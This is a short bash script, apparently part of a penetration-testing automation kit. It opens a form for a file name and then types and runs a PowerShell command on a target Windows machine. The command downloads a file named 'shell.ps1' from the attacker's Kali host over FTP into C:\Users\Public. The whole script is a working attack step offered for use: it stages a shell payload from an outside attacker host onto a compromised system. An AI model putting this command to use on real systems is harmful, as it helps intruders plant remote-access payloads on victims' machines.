#!/bin/bash

: '
download ftp file to server
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LOCAL_FILE_FIELD=$(form_item "local file" "local_file" "shell.ps1")
REMOTE_FILE_FIELD=$(form_item "remote_file" "remote_file" "C:\Users\Public\shell.ps1")

# Generate GUI form
generate_form "${LOCAL_FILE_FIELD}" "${REMOTE_FILE_FIELD}" 

LOCAL_FILE=${form_data["local_file"]}
REMOTE_FILE=${form_data["remote_file"]}

paste_command "(New-Object Net.WebClient).DownloadFile('ftp://${KALI_IP}/${LOCAL_FILE}', '${REMOTE_FILE}')"
xdotool key Return
